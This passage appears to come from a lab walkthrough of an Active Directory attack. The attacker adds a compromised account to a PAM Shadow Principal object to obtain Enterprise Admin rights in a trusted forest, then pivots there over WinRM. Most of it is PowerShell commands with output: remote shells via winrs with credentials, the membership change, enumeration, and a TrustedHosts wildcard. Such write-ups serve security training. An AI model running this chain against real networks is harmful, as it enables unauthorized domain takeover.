> The connection to the DC must be executed from the `sekurlsa::pth` session (`SEC-SYSLOG01`), as the authenticated context is process-specific due to network segmentation.

```powershell
# FROM SEC-SYSLOG01 (SYSTEM)
winrs -r:sec-dc.gcbsec.example -u:gcbsec.example\syslogagent -p:REDACTED_SECRET cmd
```

> Establish remote execution (RCE) to obtain an interactive session, enable LDAP enumeration from the compromised host, and subsequently connect to `acc-dc07`.

## ATTACK CHAIN

PAM Shadow Principal (`accforest-ShadowEnterpriseAdmin`) identified → direct mapping to Enterprise Admin in `gcbacc.example` → `syslogagent` added as a member → cross-forest privilege materialization via PAM → privileged access in `gcbacc.example` without additional exploitation

## EXPLOITATION

> Key: trust is not being abused in the traditional sense — identity (SID) is being injected via PAM (Shadow Principals).

`syslogagent` is a member of Enterprise Admins in `gcbsec.example`, granting sufficient permissions to modify objects within the Configuration container of the forest.

#### 1. Shadow Principal Abuse

> Adding the user to the Shadow Principal object causes the privileged SID to be included in their authentication token when accessing the remote forest.

```powershell
# Get the user's Distinguished Name
Get-ADUser syslogagent | select DistinguishedName

# Add syslogagent to the Shadow Principal
Set-ADObject -Identity "CN=accforest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=gcbsec,DC=local" -Add @{'member'="CN=syslogagent,CN=Users,DC=gcbsec,DC=local"}

# Verify with PowerView
$targetDomain = "gcbsec.example"
$conf=(Get-ADRootDSE -Server $targetDomain).configurationNamingContext; Get-DomainObject -Domain $targetDomain -SearchBase "CN=Shadow Principal Configuration,CN=Services,$conf" -LDAPFilter "(objectClass=msDS-ShadowPrincipal)" -Properties name,member,msDS-ShadowPrincipalSid | % { $sid = if($_.'msds-shadowprincipalsid'){ (New-Object System.Security.Principal.SecurityIdentifier($_.'msds-shadowprincipalsid',0)).Value }; [pscustomobject]@{name=$_.name;member=$_.member;msDS_ShadowPrincipalSid=$sid} } | fl
# Name                    : accforest-ShadowEnterpriseAdmin
# member                  : {CN=syslogagent,CN=Users,DC=gcbsec,DC=local}
# msDS-ShadowPrincipalSid : S-1-5-21-3331877400-209796306-1317730910-519

# Cleanup (remove membership)
Set-ADObject -Identity "CN=accforest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=gcbsec,DC=local" -Remove @{'member'="CN=syslogagent,CN=Users,DC=gcbsec,DC=local"}
```

When `syslogagent` subsequently authenticates to `gcbacc.example`, their token will include the SID corresponding to Enterprise Admins of the remote forest, granting effective administrative privileges in that environment.

#### 2. DNS Resolution Validation

Before attempting connections, DNS resolution to the remote domain is confirmed via a Conditional Forwarder:

```powershell
Get-DnsServerZone -ZoneName gcbacc.example | fl
# ZoneName      : gcbacc.example
# ZoneType      : Forwarder
# MasterServers : 10.200.12.1
# ReplicationScope : Forest
```

> "Any query for `gcbacc.example` is forwarded to `10.200.12.1`."

`gcbsec.example` can resolve the remote domain through DC `10.200.12.1`. Connectivity is validated:

```powershell
Test-NetConnection 10.200.12.1 -Port 389
Test-NetConnection 10.200.12.1 -Port 88
Test-NetConnection 10.200.12.1 -Port 445 
```

Tests fail — network segmentation is in place. A forest trust may exist in AD but remain operationally unusable due to network restrictions.

> `10.200.12.1` is the `MasterServer` defined in the Conditional Forwarder for `gcbacc.example`, acting as both Domain Controller and DNS server for the remote forest. Due to name resolution or connectivity limitations, this IP is used as the direct target, forcing authentication via WinRM with `syslogagent` credentials.

#### 3. Cross-Forest Pivot

```powershell
winrm set winrm/config/client '@{TrustedHosts="*"}' 
winrs.exe -r:10.200.12.1 -u:"syslogagent" -p:REDACTED_SECRET cmd
```

`syslogagent`, a member of `gcbsec.example`, successfully authenticates and executes commands on the Domain Controller of `gcbacc.example` — confirming a successful cross-forest pivot via PAM Shadow Principals.
